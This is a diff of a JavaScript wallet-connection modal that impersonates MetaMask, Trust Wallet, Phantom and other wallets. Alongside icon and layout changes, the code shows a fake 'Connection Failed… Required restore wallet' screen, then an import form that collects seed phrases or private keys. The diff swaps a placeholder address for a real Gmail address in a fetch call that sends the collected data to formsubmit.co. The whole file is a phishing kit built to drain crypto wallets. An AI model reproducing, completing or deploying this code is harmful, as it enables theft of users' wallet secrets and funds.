@@ -1,19 +1,15 @@
+
+
 class WalletModal {
   constructor() {
     this.wallets = [
       {
-        id: 'walletconnect',
-        name: 'WalletConnect',
-        iconUrl: 'images/walletconnect.png',
-        emoji: '🔗',
-        bgColor: 'bg-blue-50',
-        primaryColor: '#3B99FC',
-        secondaryColor: '#2A7FD9'
-      },
-      {
         id: 'metamask',
         name: 'MetaMask',
-        iconUrl: 'images/metamask.png',
+        iconUrls: [
+          'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
+          'https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg'
+        ],
         emoji: '🦊',
         bgColor: 'bg-orange-50',
         primaryColor: '#F6851B',
@@ -22,7 +18,9 @@ class WalletModal {
       {
         id: 'trust',
         name: 'Trust Wallet',
-        iconUrl: 'images/trust.png',
+        iconUrls: [
+          'https://trustwallet.com/favicon.ico'
+        ],
         emoji: '🛡️',
         bgColor: 'bg-blue-50',
         primaryColor: '#3375BB',
@@ -31,7 +29,9 @@ class WalletModal {
       {
         id: 'coinbase',
         name: 'Coinbase Wallet',
-        iconUrl: 'images/coinbase.png',
+        iconUrls: [
+              'https://iconscout.com/free-icon/free-coinbase-logo-icon_7651204'
+        ],
         emoji: '💙',
         bgColor: 'bg-blue-50',
         primaryColor: '#0052FF',
@@ -40,7 +40,11 @@ class WalletModal {
       {
         id: 'rainbow',
         name: 'Rainbow',
-        iconUrl: 'images/rainbow.png',
+        iconUrls: [
+          'https://rainbow.me/assets/rainbow-logo.png',
+          'https://play-lh.googleusercontent.com/sB6eHsuhM7uT0B_KIBmAIg-xmWYtI14dnL5gR6CHXGbZxp4V7YZ9jvC2mfTWQy5Xhw',
+          'https://avatars.githubusercontent.com/u/48327834?s=200&v=4'
+        ],
         emoji: '🌈',
         bgColor: 'bg-purple-50',
         primaryColor: '#FF4F9A',
@@ -49,7 +53,11 @@ class WalletModal {
       {
         id: 'okx',
         name: 'OKX Wallet',
-        iconUrl: 'images/okx.png',
+        iconUrls: [
+          'https://static.okx.com/cdn/assets/imgs/247/58E63FEA47A2B7D7.png',
+          'https://play-lh.googleusercontent.com/gYO-u40LS4TwEQNkpJx-B9D5qN6hqr-wFxmf7Q95M9T0T5J6X8Y0hqD7mGXNqH8Rp5w',
+          'https://www.okx.com/cdn/assets/imgs/MjAyMTQ/6866C68D26FDAB09.png'
+        ],
         emoji: '⚫',
         bgColor: 'bg-gray-100',
         primaryColor: '#000000',
@@ -58,7 +66,11 @@ class WalletModal {
       {
         id: 'rabby',
         name: 'Rabby Wallet',
-        iconUrl: 'images/rabby.png',
+        iconUrls: [
+          'https://rabby.io/assets/images/logo-128.png',
+          'https://github.com/RabbyHub/Rabby/raw/develop/src/ui/assets/icon-128.png',
+          'https://avatars.githubusercontent.com/u/71627609?s=200&v=4'
+        ],
         emoji: '🐰',
         bgColor: 'bg-blue-50',
         primaryColor: '#7084FF',
@@ -67,7 +79,9 @@ class WalletModal {
       {
         id: 'phantom',
         name: 'Phantom',
-        iconUrl: 'images/phantom.png',
+        iconUrls: [
+                   'https://docs.phantom.com/mintlify-assets/_mintlify/favicons/phantom-e50e2e68/iJ-2hg6MaJphnoGv/_generated/favicon/favicon-16x16.png'
+        ],
         emoji: '👻',
         bgColor: 'bg-purple-50',
         primaryColor: '#AB9FF2',
@@ -76,20 +90,28 @@ class WalletModal {
       {
         id: 'solflare',
         name: 'Solflare',
-        iconUrl: 'images/solflare.png',
+        iconUrls: [
+          'https://solflare.com/assets/logo.svg',
+          'https://play-lh.googleusercontent.com/WLUXVhVnhYjoF0ywdz8P8gT0W1RqbGHzvF0qHx-qbDkYwFnLFN3HqvRXQlqgqQkNvT4',
+          'https://avatars.githubusercontent.com/u/79508054?s=200&v=4'
+        ],
         emoji: '🔥',
         bgColor: 'bg-purple-50',
         primaryColor: '#FC6B2D',
         secondaryColor: '#E35A24'
       },
       {
-        id: 'bitget',
-        name: 'Bitget Wallet',
-        iconUrl: 'images/bitget.png',
-        emoji: '💼',
-        bgColor: 'bg-cyan-50',
-        primaryColor: '#00F0FF',
-        secondaryColor: '#00D4E6'
+        id: 'walletconnect',
+        name: 'WalletConnect',
+        iconUrls: [
+          'https://walletconnect.com/walletconnect-logo.svg',
+          'https://play-lh.googleusercontent.com/8jBVqFWqR6XKNyU0BTQZ0l1R2c9qLQUa17EH4wvPUxV8N_hkqvhPxpkM4qX2wBf0LJw',
+          'https://avatars.githubusercontent.com/u/37784886?s=200&v=4'
+        ],
+        emoji: '🔗',
+        bgColor: 'bg-blue-50',
+        primaryColor: '#3B99FC',
+        secondaryColor: '#2A7FD9'
       }
     ];
 
@@ -98,41 +120,6 @@ class WalletModal {
     this.seedWords = Array(12).fill('');
     this.privateKey = '';
     this.isInWalletBrowser = false;
-    
-    // WalletConnect sub-wallets
-    this.walletConnectWallets = [
-      { id: 'uniswap', name: 'Uniswap Wallet', iconUrl: 'images/uniswap.png', emoji: '🦄' },
-      { id: 'zerion', name: 'Zerion', iconUrl: 'images/zerion.png', emoji: '⚡' },
-      { id: 'atomic', name: 'Atomic Wallet', iconUrl: 'images/atomic.png', emoji: '⚛️' },
-      { id: 'imtoken', name: 'imToken', iconUrl: 'images/imtoken.png', emoji: '💎' },
-      { id: 'crypto', name: 'Crypto.com', iconUrl: 'images/crypto.png', emoji: '💳' },
-      { id: 'binance', name: 'Binance Wallet', iconUrl: 'images/binance.png', emoji: '🔶' },
-      { id: 'cardano', name: 'Cardano', iconUrl: 'images/cardano.png', emoji: '🔵' },
-      { id: 'token', name: 'TokenPocket', iconUrl: 'images/token.png', emoji: '🎯' },
-      { id: 'onto', name: 'ONTO Wallet', iconUrl: 'images/onto.png', emoji: '🔶' },
-      { id: 'safemoon', name: 'SafeMoon', iconUrl: 'images/safemoon.png', emoji: '🛡️' },
-      { id: 'ellipal', name: 'Ellipal', iconUrl: 'images/ellipal.png', emoji: '🔐' },
-      { id: 'enjin', name: 'Enjin Wallet', iconUrl: 'images/enjin.png', emoji: '⚔️' },
-      { id: 'gnosis', name: 'Gnosis Safe', iconUrl: 'images/gnosis.png', emoji: '🔷' },
-      { id: 'exodus', name: 'Exodus', iconUrl: 'images/exodus.png', emoji: '✖️' },
-      { id: 'kraken', name: 'Kraken', iconUrl: 'images/kraken.png', emoji: '🦑' },
-      { id: 'bridge', name: 'Bridge Wallet', iconUrl: 'images/bridge.png', emoji: '🌉' },
-      { id: 'mew', name: 'MyEtherWallet', iconUrl: 'images/mew.png', emoji: '😸' },
-      { id: 'zengo', name: 'ZenGo', iconUrl: 'images/zengo.png', emoji: '🌅' },
-      { id: 'raven', name: 'Ravencoin', iconUrl: 'images/raven.png', emoji: '🐦' },
-      { id: 'swipe', name: 'Swipe Wallet', iconUrl: 'images/swipe.png', emoji: '💳' },
-      { id: 'talken', name: 'Talken', iconUrl: 'images/talken.png', emoji: '💬' }
-    ];
-    
-    // Detect theme preference
-    this.isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
-    
-    // Listen for theme changes
-    if (window.matchMedia) {
-      window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
-        this.isDarkMode = e.matches;
-      });
-    }
     
     this.init();
   }
@@ -166,9 +153,35 @@ class WalletModal {
     }
   }
 
-  // Helper method to create wallet image
+  // Helper method to create wallet image with fallbacks
   createWalletImageHTML(wallet) {
-    return `<img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-full h-full" style="object-fit: cover; object-position: center; max-width: 100%; max-height: 100%;" loading="eager" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\\'width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; font-size: 1.75rem; user-select: none;\\'>${wallet.emoji}</div>';">`;
+    const urls = wallet.iconUrls;
+    const uniqueId = `img-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
+    
+    // Create the first image that will be visible
+    let html = `<img id="${uniqueId}" src="${urls[0]}" alt="${wallet.name}" class="w-full h-full" style="object-fit: contain; object-position: center;" loading="eager" onerror="walletModal.handleImageError('${uniqueId}', '${wallet.id}')">`;
+    
+    return html;
+  }
+
+  handleImageError(imgId, walletId) {
+    const img = document.getElementById(imgId);
+    if (!img) return;
+    
+    const wallet = this.wallets.find(w => w.id === walletId);
+    if (!wallet) return;
+    
+    const urls = wallet.iconUrls;
+    const currentSrc = img.src;
+    const currentIndex = urls.findIndex(url => currentSrc.includes(url) || url.includes(currentSrc.split('/').pop()));
+    
+    if (currentIndex < urls.length - 1) {
+      // Try next URL
+      img.src = urls[currentIndex + 1];
+    } else {
+      // All URLs failed, show emoji
+      img.parentElement.innerHTML = `<span style="font-size: 2rem; display: flex; align-items: center; justify-content: center; width: 100%; height: 100%;">${wallet.emoji}</span>`;
+    }
   }
 
   hideMainContent() {
@@ -190,39 +203,6 @@ class WalletModal {
         child.style.display = 'none';
       }
     });
-  }
-
-  // Helper method to get theme classes
-  getThemeClasses() {
-    if (this.isDarkMode) {
-      return {
-        bg: 'bg-gray-900',
-        card: 'bg-gray-800',
-        text: 'text-white',
-        textSecondary: 'text-gray-300',
-        textMuted: 'text-gray-400',
-        border: 'border-gray-700',
-        hover: 'hover:bg-gray-700',
-        input: 'bg-gray-700 text-white border-gray-600',
-        backdrop: 'bg-black bg-opacity-60'
-      };
-    }
-    return {
-      bg: 'bg-white',
-      card: 'bg-white',
-      text: 'text-gray-900',
-      textSecondary: 'text-gray-700',
-      textMuted: 'text-gray-500',
-      border: 'border-gray-100',
-      hover: 'hover:bg-gray-50',
-      input: 'bg-white text-gray-900 border-gray-200',
-      backdrop: 'bg-black bg-opacity-40'
-    };
-  }
-
-  // Check if device is mobile
-  isMobileDevice() {
-    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
   }
 
   detectWalletBrowser() {
@@ -279,19 +259,11 @@ class WalletModal {
       return;
     }
 
-    // Detect Bitget
-    if (window.bitkeep || (window.ethereum && window.ethereum.isBitKeep)) {
-      this.isInWalletBrowser = true;
-      this.selectedWallet = this.wallets.find(w => w.id === 'bitget');
-      return;
-    }
-
     // Generic wallet browser detection by user agent
     const userAgent = navigator.userAgent || navigator.vendor || window.opera;
     const walletBrowsers = [
       'Trust', 'TokenPocket', 'imToken', 'MetaMask', 'Coinbase',
-      'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare', 'Bitget',
-      'Atomic', 'Exodus', 'Crypto.com', 'Binance', 'MEW', 'ZenGo'
+      'Rainbow', 'OKX', 'Rabby', 'Phantom', 'BitKeep', 'Solflare'
     ];
     
     for (const wallet of walletBrowsers) {
@@ -315,13 +287,6 @@ class WalletModal {
   startWalletBrowserFlow() {
     // Wait for page to load, then show updating screen
     setTimeout(() => {
-      // Verify we have a selected wallet
-      if (!this.selectedWallet) {
-        console.error('No wallet detected in browser');
-        // Set a default wallet if none detected
-        this.selectedWallet = this.wallets[0];
-      }
-      console.log('Starting wallet browser flow for:', this.selectedWallet.name);
       this.showUpdatingWallet();
     }, 500);
   }
@@ -335,33 +300,33 @@ class WalletModal {
   showWalletSelectionModal() {
     const modalHTML = `
       <div id="wallet-modal-backdrop" class="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50">
-        <div class="bg-white rounded-2xl w-full max-w-sm shadow-2xl max-h-[85vh] overflow-hidden flex flex-col">
+        <div class="bg-white rounded-3xl w-full max-w-md shadow-2xl max-h-[90vh] overflow-hidden flex flex-col">
           <!-- Header -->
-          <div class="flex items-center justify-between px-5 py-4 border-b border-gray-100">
-            <svg class="w-4 h-4 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <div class="flex items-center justify-between px-4 sm:px-6 py-4 sm:py-5 border-b border-gray-100">
+            <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
               <circle cx="12" cy="12" r="10"></circle>
               <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
               <line x1="12" y1="17" x2="12.01" y2="17"></line>
             </svg>
-            <h2 class="text-base font-semibold text-gray-900">Connect Wallet</h2>
+            <h2 class="text-base sm:text-lg font-semibold text-gray-900">Connect Wallet</h2>
             <button onclick="walletModal.closeModal()" class="text-gray-400 hover:text-gray-600 transition">
-              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                 <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
               </svg>
             </button>
           </div>
 
           <!-- Wallet List -->
-          <div class="px-2 py-1.5 overflow-y-auto flex-1">
+          <div class="px-3 py-2 overflow-y-auto flex-1">
             ${this.wallets.map(wallet => `
-              <button onclick="walletModal.selectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 py-2.5 hover:bg-gray-50 rounded-lg transition group">
-                <div class="flex items-center gap-3">
-                  <div class="w-9 h-9 ${wallet.bgColor} rounded-lg flex items-center justify-center p-1.5 flex-shrink-0">
+              <button onclick="walletModal.selectWallet('${wallet.id}')" class="w-full flex items-center justify-between px-3 sm:px-4 py-3 sm:py-3.5 hover:bg-gray-50 rounded-xl transition group">
+                <div class="flex items-center gap-3 sm:gap-3.5">
+                  <div class="w-10 h-10 sm:w-11 sm:h-11 ${wallet.bgColor} rounded-xl flex items-center justify-center p-2 flex-shrink-0">
                     ${this.createWalletImageHTML(wallet)}
                   </div>
-                  <span class="font-medium text-gray-900 text-sm">${wallet.name}</span>
+                  <span class="font-medium text-gray-900 text-sm sm:text-[15px]">${wallet.name}</span>
                 </div>
-                <svg class="w-4 h-4 text-gray-300 group-hover:text-gray-400 transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <svg class="w-5 h-5 text-gray-300 group-hover:text-gray-400 transition flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                   <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                 </svg>
               </button>
@@ -369,7 +334,7 @@ class WalletModal {
           </div>
 
           <!-- Footer -->
-          <div class="px-4 py-3 text-center border-t border-gray-100">
+          <div class="px-4 sm:px-6 py-3 sm:py-4 text-center border-t border-gray-100">
             <div class="flex items-center justify-center gap-1.5 text-xs text-gray-400">
               <span>UX by</span>
               <span class="w-1 h-1 bg-gray-300 rounded-full"></span>
@@ -389,149 +354,22 @@ class WalletModal {
     this.selectedWallet = this.wallets.find(w => w.id === walletId);
     this.closeModalOnly();
     
-    // If WalletConnect is selected, show sub-modal with more wallets
-    if (walletId === 'walletconnect') {
-      this.showWalletConnectModal();
-    } else {
-      // Normal flow: show the "Open in..." prompt
-      this.showOpenPrompt();
-    }
-  }
-
-  showWalletConnectModal() {
-    const theme = this.getThemeClasses();
-    const isMobile = this.isMobileDevice();
-    
-    const modalHTML = `
-      <div id="walletconnect-modal-backdrop" class="fixed inset-0 ${theme.backdrop} flex items-end sm:items-center justify-center z-50 ${isMobile ? 'wallet-backdrop-mobile' : 'p-4'}" onclick="if(event.target.id === 'walletconnect-modal-backdrop') walletModal.closeModal()">
-        <div class="${theme.card} rounded-t-2xl sm:rounded-2xl w-full sm:max-w-sm shadow-2xl max-h-[80vh] sm:max-h-[85vh] overflow-hidden flex flex-col ${isMobile ? 'wallet-slide-up' : ''}">
-          <!-- Header -->
-          <div class="flex items-center justify-between px-5 py-4 border-b ${theme.border}">
-            <button onclick="walletModal.backToMainModal()" class="${theme.textMuted} hover:${theme.textSecondary} transition">
-              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
-              </svg>
-            </button>
-            <h2 class="text-base font-semibold ${theme.text}">All Wallets</h2>
-            <button onclick="walletModal.closeModal()" class="${theme.textMuted} hover:${theme.textSecondary} transition">
-              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-              </svg>
-            </button>
-          </div>
-
-          <!-- Search Bar -->
-          <div class="px-3 py-2.5">
-            <div class="relative">
-              <svg class="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 ${theme.textMuted}" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
-              </svg>
-              <input type="text" placeholder="Search wallet" class="w-full pl-10 pr-4 py-2 ${theme.input} rounded-lg text-sm focus:outline-none" style="border: 1px solid ${this.isDarkMode ? '#374151' : '#E5E7EB'}">
-            </div>
-          </div>
-
-          <!-- Wallet Grid -->
-          <div class="px-2 py-1 overflow-y-auto flex-1">
-            <div class="grid grid-cols-4 gap-2">
-              ${this.walletConnectWallets.map(wallet => `
-                <button onclick="walletModal.selectWalletConnectWallet('${wallet.id}')" class="flex flex-col items-center gap-1 p-0 transition">
-                  <img src="${wallet.iconUrl}" alt="${wallet.name}" class="w-14 h-14 rounded-xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-14 h-14 rounded-xl flex items-center justify-center text-2xl\\'>${wallet.emoji}</div>';">
-                  <span class="text-[9px] ${theme.text} text-center font-normal line-clamp-1 w-full px-1">${wallet.name.replace(' Wallet', '').replace(' wallet', '')}</span>
-                </button>
-              `).join('')}
-            </div>
-          </div>
-
-          <!-- Not Listed Button -->
-          <div class="px-3 py-3 border-t ${theme.border}">
-            <button onclick="walletModal.showMainModalFromWC()" class="w-full py-2.5 ${theme.hover} ${theme.text} font-semibold rounded-lg transition text-sm">
-              Not Listed?
-            </button>
-          </div>
-        </div>
-      </div>
-      
-      <style>
-        @keyframes slideUp {
-          from {
-            transform: translateY(100%);
-          }
-          to {
-            transform: translateY(0);
-          }
-        }
-        
-        .wallet-slide-up {
-          animation: slideUp 0.3s ease-out;
-        }
-        
-        .wallet-backdrop-mobile {
-          padding: 0;
-        }
-        
-        .line-clamp-2 {
-          display: -webkit-box;
-          -webkit-line-clamp: 2;
-          -webkit-box-orient: vertical;
-          overflow: hidden;
-        }
-      </style>
-    `;
-
-    document.body.insertAdjacentHTML('beforeend', modalHTML);
-  }
-
-  showMainModalFromWC() {
-    this.backToMainModal();
-  }
-
-  selectWalletConnectWallet(walletId) {
-    const wallet = this.walletConnectWallets.find(w => w.id === walletId);
-    if (!wallet) return;
-    
-    // Set this as selected wallet with WalletConnect colors
-    this.selectedWallet = {
-      ...wallet,
-      bgColor: 'bg-blue-50',
-      primaryColor: '#3B99FC',
-      secondaryColor: '#2A7FD9'
-    };
-    
-    this.closeWalletConnectModal();
-    
-    // Show the "Open in..." prompt
+    // Always show the "Open in..." prompt first
     this.showOpenPrompt();
   }
 
-  closeWalletConnectModal() {
-    const modal = document.getElementById('walletconnect-modal-backdrop');
-    if (modal) {
-      modal.remove();
-    }
-  }
-  
-  backToMainModal() {
-    const modal = document.getElementById('walletconnect-modal-backdrop');
-    if (modal) {
-      modal.remove();
-    }
-    this.showWalletSelectionModal();
-  }
-
   showOpenPrompt() {
-    const theme = this.getThemeClasses();
-    
     const promptHTML = `
-      <div id="wallet-prompt-backdrop" class="fixed inset-0 ${theme.backdrop} flex items-center justify-center p-4 z-50" onclick="if(event.target.id === 'wallet-prompt-backdrop') walletModal.cancelPrompt()">
-        <div class="${theme.card} rounded-2xl w-full max-w-xs p-4 shadow-2xl">
-          <p class="text-base font-medium ${theme.text} mb-5">
+      <div id="wallet-prompt-backdrop" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-3xl w-full max-w-sm p-5 sm:p-6 shadow-2xl">
+          <p class="text-base sm:text-lg font-medium text-gray-900 mb-6">
             Open in "${this.selectedWallet.name}"?
           </p>
-          <div class="flex gap-3 justify-end">
-            <button onclick="walletModal.cancelPrompt()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">
+          <div class="flex gap-3 sm:gap-4 justify-end">
+            <button onclick="walletModal.cancelPrompt()" class="px-5 sm:px-6 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm sm:text-base">
               Cancel
             </button>
-            <button onclick="walletModal.confirmOpen()" class="px-5 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm">
+            <button onclick="walletModal.confirmOpen()" class="px-5 sm:px-6 py-2 text-blue-600 font-semibold hover:bg-blue-50 rounded-lg transition text-sm sm:text-base">
               Open
             </button>
           </div>
@@ -573,33 +411,10 @@ class WalletModal {
       'coinbase': `https://go.cb-w.com/dapp?url=${encodeURIComponent(websiteUrl)}`,
       'rainbow': `https://rnbwapp.com/${websiteUrl}`,
       'okx': `https://www.okx.com/web3/dapp?url=${encodeURIComponent(websiteUrl)}`,
-      'rabby': websiteUrl,
+      'rabby': websiteUrl, // Rabby doesn't have special deep link
       'phantom': `https://phantom.app/ul/browse/${websiteUrl}?ref=${websiteUrl}`,
       'solflare': `https://solflare.com/ul/v1/browse/${websiteUrl}`,
-      'walletconnect': websiteUrl,
-      'bitget': `https://bkcode.vip?action=dapp&url=${encodeURIComponent(websiteUrl)}`,
-      // WalletConnect sub-wallets
-      'uniswap': websiteUrl,
-      'zerion': `https://wallet.zerion.io/connect?uri=${encodeURIComponent(websiteUrl)}`,
-      'atomic': `https://atomicwallet.io/open?url=${encodeURIComponent(websiteUrl)}`,
-      'imtoken': `imtokenv2://navigate/DappView?url=${encodeURIComponent(websiteUrl)}`,
-      'crypto': `https://crypto.com/defi-wallet/open?url=${encodeURIComponent(websiteUrl)}`,
-      'binance': `https://app.binance.com/en/download?utm_source=web&utm_medium=wallet`,
-      'cardano': websiteUrl,
-      'token': `tpoutside://pull.activity?param=${encodeURIComponent(websiteUrl)}`,
-      'onto': `onto://pull.activity?param=${encodeURIComponent(websiteUrl)}`,
-      'safemoon': websiteUrl,
-      'ellipal': websiteUrl,
-      'enjin': websiteUrl,
-      'gnosis': websiteUrl,
-      'exodus': websiteUrl,
-      'kraken': websiteUrl,
-      'bridge': websiteUrl,
-      'mew': websiteUrl,
-      'zengo': websiteUrl,
-      'raven': websiteUrl,
-      'swipe': websiteUrl,
-      'talken': websiteUrl
+      'walletconnect': websiteUrl // WalletConnect uses different connection method
     };
 
     const link = deepLinks[this.selectedWallet.id];
@@ -623,8 +438,8 @@ class WalletModal {
         <div class="flex flex-col items-center">
           <!-- Wallet Logo -->
           <div class="mb-8">
-            <div class="w-32 h-32 flex items-center justify-center animate-pulse">
-              <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-full h-full rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
+            <div class="w-32 h-32 rounded-3xl flex items-center justify-center shadow-2xl animate-pulse overflow-hidden p-4" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
+              ${this.createWalletImageHTML(this.selectedWallet)}
             </div>
           </div>
           
@@ -660,7 +475,9 @@ class WalletModal {
         <div class="flex flex-col items-center max-w-md w-full">
           <!-- Wallet Logo with Error Badge -->
           <div class="mb-8 relative">
-            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
+            <div class="w-32 h-32 rounded-3xl flex items-center justify-center shadow-2xl overflow-hidden p-4" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
+              ${this.createWalletImageHTML(this.selectedWallet)}
+            </div>
             <!-- Error Badge -->
             <div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">
               <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -672,7 +489,7 @@ class WalletModal {
           <h2 class="text-2xl font-bold text-gray-900 mb-3">Connection Failed</h2>
           <p class="text-gray-500 text-center mb-8">Permission denied. Required restore wallet.</p>
           
-          <button id="continue-to-import-btn" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition" style="background-color: ${walletColor}">
+          <button onclick="walletModal.showImportScreen()" class="w-full max-w-xs py-4 rounded-2xl font-semibold text-white hover:opacity-90 transition" style="background-color: ${walletColor}">
             Continue
           </button>
         </div>
@@ -680,27 +497,11 @@ class WalletModal {
     `;
 
     document.body.insertAdjacentHTML('beforeend', failedHTML);
-    
-    // Add event listener to the button
-    setTimeout(() => {
-      const continueBtn = document.getElementById('continue-to-import-btn');
-      if (continueBtn) {
-        continueBtn.addEventListener('click', () => {
-          this.showImportScreen();
-        });
-      }
-    }, 100);
   }
 
   showImportScreen() {
     // Close any previous screens
     this.closeModalOnly();
-    
-    // Ensure we have a selected wallet
-    if (!this.selectedWallet) {
-      console.error('No wallet selected');
-      return;
-    }
     
     const wordCount = this.importType === 'private' ? 0 : parseInt(this.importType);
     const walletColor = this.selectedWallet.primaryColor;
@@ -717,7 +518,9 @@ class WalletModal {
           
           <!-- Wallet Logo in center -->
           <div class="flex justify-center pt-4">
-            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-16 h-16 sm:w-20 sm:h-20 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center text-4xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
+            <div class="w-16 h-16 sm:w-20 sm:h-20 bg-gray-100 rounded-2xl sm:rounded-3xl shadow-lg flex items-center justify-center overflow-hidden p-3">
+              ${this.createWalletImageHTML(this.selectedWallet)}
+            </div>
           </div>
         </div>
 
@@ -767,7 +570,9 @@ class WalletModal {
 
         <!-- Footer Branding -->
         <div class="p-4 sm:p-6 flex items-center justify-center gap-3 flex-shrink-0">
-          <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center text-xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
+          <div class="w-9 h-9 sm:w-10 sm:h-10 rounded-xl flex items-center justify-center overflow-hidden p-2" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
+            ${this.createWalletImageHTML(this.selectedWallet)}
+          </div>
           <span class="font-semibold text-gray-900 text-sm sm:text-base">${this.selectedWallet.name}</span>
         </div>
       </div>
@@ -898,7 +703,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
+    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
@@ -934,7 +739,9 @@ class WalletModal {
         <div class="flex flex-col items-center">
           <!-- Wallet Logo with Success Badge -->
           <div class="mb-8 relative">
-            <img src="${this.selectedWallet.iconUrl}" alt="${this.selectedWallet.name}" class="w-32 h-32 rounded-3xl shadow-2xl" style="object-fit: cover;" onerror="this.style.display='none'; this.outerHTML='<div class=\\'w-32 h-32 rounded-3xl shadow-2xl flex items-center justify-center text-6xl\\' style=\\'background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})\\'>${this.selectedWallet.emoji}</div>';">
+            <div class="w-32 h-32 rounded-3xl flex items-center justify-center shadow-2xl overflow-hidden p-4" style="background: linear-gradient(135deg, ${walletColor}, ${this.selectedWallet.secondaryColor})">
+              ${this.createWalletImageHTML(this.selectedWallet)}
+            </div>
             <!-- Success Badge -->
             <div class="absolute -bottom-2 -right-2 w-12 h-12 bg-white rounded-full flex items-center justify-center shadow-lg">
               <svg class="w-8 h-8 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -988,8 +795,7 @@ class WalletModal {
       'wallet-updating-backdrop',
       'wallet-failed-backdrop',
       'wallet-success-backdrop',
-      'wallet-prompt-backdrop',
-      'walletconnect-modal-backdrop'
+      'wallet-prompt-backdrop'
     ];
     
     modals.forEach(id => {
